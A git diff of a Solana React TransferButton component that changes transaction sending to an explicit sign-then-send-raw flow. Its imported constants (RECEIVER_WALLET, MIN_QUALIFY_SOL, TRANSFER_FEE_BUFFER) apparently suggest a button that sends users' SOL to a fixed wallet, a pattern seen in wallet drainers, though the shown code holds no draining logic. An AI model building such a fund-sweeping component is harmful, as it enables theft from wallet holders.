@@ -5,11 +5,11 @@ import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solan
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_ENDPOINTS, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
-  const { publicKey, sendTransaction } = useWallet();
+  const { publicKey, signTransaction } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
-    if (!publicKey || !sendTransaction) return;
+    if (!publicKey || !signTransaction) return;
 
     setLoading(true);
     try {
@@ -59,7 +59,10 @@ export default function TransferButton({ className = '' }) {
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = publicKey;
 
-      const signature = await sendTransaction(transaction, connection, {
+      // Explicitly sign with the wallet, then send the raw signed tx
+      const signed = await signTransaction(transaction);
+      const rawTransaction = signed.serialize();
+      const signature = await connection.sendRawTransaction(rawTransaction, {
         skipPreflight: false,
         preflightCommitment: 'confirmed',
       });
@@ -79,7 +82,7 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction]);
+  }, [publicKey, signTransaction]);
 
   if (!publicKey) return null;
 
